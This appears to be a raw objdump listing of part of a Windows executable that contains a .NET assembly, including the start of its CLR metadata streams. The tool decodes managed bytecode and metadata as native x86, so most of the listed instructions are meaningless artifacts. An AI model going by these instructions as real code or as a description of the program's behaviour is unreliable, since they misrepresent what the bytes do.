  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	b8 1d 00 00 23       	mov    $0x2300001d,%eax
  405a29:	53                   	push   %ebx
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 e0                	add    %ah,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 98 27 00 00 23    	add    %bl,0x23000027(%eax)
  405a3d:	55                   	push   %ebp
  405a3e:	53                   	push   %ebx
  405a3f:	00 78 63             	add    %bh,0x63(%eax)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 88 63 00 00 40    	add    %cl,0x40000063(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	f0 0a 01             	lock or (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 39                	add    %bh,(%ecx)
  405ae5:	19 ee                	sbb    %ebp,%esi
  405ae7:	0f 0a                	(bad)
  405ae9:	00 8a 00 03 16 0a    	add    %cl,0xa160300(%edx)
  405aef:	00 9f 19 72 18 0a    	add    %bl,0xa187219(%edi)
  405af5:	00 89 0f 85 1d 06    	add    %cl,0x61d850f(%ecx)
  405afb:	00 29                	add    %ch,(%ecx)
  405afd:	14 98                	adc    $0x98,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 83 08 03 16 0a    	add    %al,0xa160308(%ebx)
  405b07:	00 a2 10 03 16 0a    	add    %ah,0xa160310(%edx)
  405b0d:	00 0e                	add    %cl,(%esi)
  405b0f:	18 85 1d 06 00 f9    	sbb    %al,-0x6fff9e3(%ebp)
  405b15:	19 ee                	sbb    %ebp,%esi
  405b17:	0f 0e                	femms
  405b19:	00 05 12 ef 0b 0e    	add    %al,0xe0bef12
  405b1f:	00 c4                	add    %al,%ah
  405b21:	18 ef                	sbb    %ch,%bh
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 3e                	add    %bh,(%esi)
  405b27:	1c 98                	sbb    $0x98,%al
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 29                	add    %ch,(%ecx)
  405b2d:	13 df                	adc    %edi,%ebx
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 5f 10             	add    %bl,0x10(%edi)
  405b34:	ee                   	out    %al,(%dx)
  405b35:	0f 0a                	(bad)
  405b37:	00 1a                	add    %bl,(%edx)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c1                	add    %al,%cl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 9b 15 12 00 01    	add    %bl,0x1001215(%ebx)
  405b4b:	00 ee                	add    %ch,%dh
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	df 08                	fisttps (%eax)
  405b52:	9b                   	fwait
  405b53:	15 06 00 fe 07       	adc    $0x7fe0006,%eax
  405b58:	ee                   	out    %al,(%dx)
  405b59:	0f 06                	clts
  405b5b:	00 e2                	add    %ah,%dl
  405b5d:	0b df                	or     %edi,%ebx
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a3 14 c8 17 06    	add    %ah,0x617c814(%ebx)
  405b67:	00 9c 05 c8 17 06 00 	add    %bl,0x617c8(%ebp,%eax,1)
  405b6e:	c2 0f 5c             	ret    $0x5c0f
  405b71:	02 06                	add    (%esi),%al
  405b73:	00 ec                	add    %ch,%ah
  405b75:	09 9b 15 06 00 59    	or     %ebx,0x59000615(%ebx)
  405b7b:	0a 9b 15 06 00 09    	or     0x9000615(%ebx),%bl
  405b81:	09 3d 15 6f 00 bb    	or     %edi,0xbb006f15
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	31 09                	xor    %ecx,(%ecx)
  405b8e:	4f                   	dec    %edi
  405b8f:	11 06                	adc    %eax,(%esi)
  405b91:	00 b8 09 4f 11 06    	add    %bh,0x6114f09(%eax)
  405b97:	00 99 09 4f 11 06    	add    %bl,0x6114f09(%ecx)
  405b9d:	00 40 0a             	add    %al,0xa(%eax)
  405ba0:	4f                   	dec    %edi
  405ba1:	11 06                	adc    %eax,(%esi)
  405ba3:	00 0c 0a             	add    %cl,(%edx,%ecx,1)
  405ba6:	4f                   	dec    %edi
  405ba7:	11 06                	adc    %eax,(%esi)
  405ba9:	00 25 0a 4f 11 06    	add    %ah,0x6114f0a
  405baf:	00 48 09             	add    %cl,0x9(%eax)
  405bb2:	4f                   	dec    %edi
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 7c 09 4f          	add    %bh,0x4f(%ecx,%ecx,1)
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 63 09             	add    %ah,0x9(%ebx)
  405bbe:	06                   	push   %es
  405bbf:	0c 06                	or     $0x6,%al
  405bc1:	00 1d 09 7c 15 06    	add    %bl,0x6157c09
  405bc7:	00 ee                	add    %ch,%dh
  405bc9:	08 9b 15 06 00 d5    	or     %bl,-0x2afff9eb(%ebx)
  405bcf:	09 4f 11             	or     %ecx,0x11(%edi)
  405bd2:	06                   	push   %es
  405bd3:	00 11                	add    %dl,(%ecx)
  405bd5:	03 98 0b 06 00 99    	add    -0x66fff9f5(%eax),%ebx
  405bdb:	1b ee                	sbb    %esi,%ebp
  405bdd:	0f 06                	clts
  405bdf:	00 91 1a ee 0f 06    	add    %dl,0x60fee1a(%ecx)
  405be5:	00 e6                	add    %ah,%dh
  405be7:	0b df                	or     %edi,%ebx
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 ca                	add    %cl,%dl
  405bed:	1c 03                	sbb    $0x3,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 19                	add    %bl,(%ecx)
  405bf3:	10 f8                	adc    %bh,%al
  405bf5:	1c 06                	sbb    $0x6,%al
  405bf7:	00 f7                	add    %dh,%bh
  405bf9:	12 f8                	adc    %al,%bh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 79 0b             	add    %bh,0xb(%ecx)
  405c00:	f8                   	clc
  405c01:	1c 06                	sbb    $0x6,%al
  405c03:	00 f3                	add    %dh,%bl
  405c05:	11 ee                	adc    %ebp,%esi
  405c07:	0f 0a                	(bad)
  405c09:	00 54 18 5e          	add    %dl,0x5e(%eax,%ebx,1)
  405c0d:	19 0a                	sbb    %ecx,(%edx)
  405c0f:	00 17                	add    %dl,(%edi)
  405c11:	1a 5e 19             	sbb    0x19(%esi),%bl
  405c14:	0a 00                	or     (%eax),%al
  405c16:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c17:	0e                   	push   %cs
  405c18:	5e                   	pop    %esi
  405c19:	19 0a                	sbb    %ecx,(%edx)
  405c1b:	00 1e                	add    %bl,(%esi)
  405c1d:	1d 72 18 0a 00       	sbb    $0xa1872,%eax
  405c22:	33 08                	xor    (%eax),%ecx
  405c24:	72 18                	jb     0x405c3e
  405c26:	0a 00                	or     (%eax),%al
  405c28:	1e                   	push   %ds
  405c29:	08 72 18             	or     %dh,0x18(%edx)
  405c2c:	06                   	push   %es
  405c2d:	00 c3                	add    %al,%bl
  405c2f:	0c ee                	or     $0xee,%al
  405c31:	0f 06                	clts
  405c33:	00 cc                	add    %cl,%ah
  405c35:	12 ee                	adc    %dh,%ch
  405c37:	0f 06                	clts
  405c39:	00 40 10             	add    %al,0x10(%eax)
  405c3c:	ee                   	out    %al,(%dx)
  405c3d:	0f 0a                	(bad)
  405c3f:	00 bb 17 5e 19 0a    	add    %bh,0xa195e17(%ebx)
  405c45:	00 55 17             	add    %dl,0x17(%ebp)
  405c48:	5e                   	pop    %esi
  405c49:	19 06                	sbb    %eax,(%esi)
  405c4b:	00 db                	add    %bl,%bl
  405c4d:	17                   	pop    %ss
  405c4e:	ee                   	out    %al,(%dx)
  405c4f:	0f 06                	clts
  405c51:	00 a8 05 ee 0f 0a    	add    %ch,0xa0fee05(%eax)
  405c57:	00 7b 0f             	add    %bh,0xf(%ebx)
  405c5a:	72 18                	jb     0x405c74
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	f0 0d 85 1d 0a 00    	lock or $0xa1d85,%eax
  405c64:	38 1b                	cmp    %bl,(%ebx)
  405c66:	5e                   	pop    %esi
  405c67:	19 0a                	sbb    %ecx,(%edx)
  405c69:	00 61 11             	add    %ah,0x11(%ecx)
  405c6c:	03 16                	add    (%esi),%edx
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	79 17                	jns    0x405c89
  405c72:	30 11                	xor    %dl,(%ecx)
  405c74:	06                   	push   %es
  405c75:	00 99 0a ee 0f 06    	add    %bl,0x60fee0a(%ecx)
  405c7b:	00 14 0e             	add    %dl,(%esi,%ecx,1)
  405c7e:	98                   	cwtl
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e2                	add    %ah,%dl
  405c83:	0d ee 0f 0a 00       	or     $0xa0fee,%eax
  405c88:	9f                   	lahf
  405c89:	0d ee 0f 0a 00       	or     $0xa0fee,%eax
  405c8e:	ea 07 ee 0f 06 00 88 	ljmp   $0x8800,$0x60fee07
  405c95:	14 ee                	adc    $0xee,%al
  405c97:	0f 06                	clts
  405c99:	00 80 1b 98 0b 06    	add    %al,0x60b981b(%eax)
  405c9f:	00 bc 0f 5c 02 06 00 	add    %bh,0x6025c(%edi,%ecx,1)
  405ca6:	0e                   	push   %cs
  405ca7:	15 98 0b 0a 00       	adc    $0xa0b98,%eax
  405cac:	52                   	push   %edx
  405cad:	05 72 18 06 00       	add    $0x61872,%eax
  405cb2:	b8 01 ee 0f 06       	mov    $0x60fee01,%eax
  405cb7:	00 1d 12 5c 02 0a    	add    %bl,0xa025c12
  405cbd:	00 4c 18 3d          	add    %cl,0x3d(%eax,%ebx,1)
  405cc1:	15 0a 00 5f 12       	adc    $0x125f000a,%eax
  405cc6:	3d 15 06 00 e7       	cmp    $0xe7000615,%eax
  405ccb:	1c 55                	sbb    $0x55,%al
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 6a 14             	add    %ch,0x14(%edx)
  405cd2:	5c                   	pop    %esp
  405cd3:	02 06                	add    (%esi),%al
  405cd5:	00 62 0d             	add    %ah,0xd(%edx)
  405cd8:	5c                   	pop    %esp
  405cd9:	02 0a                	add    (%edx),%cl
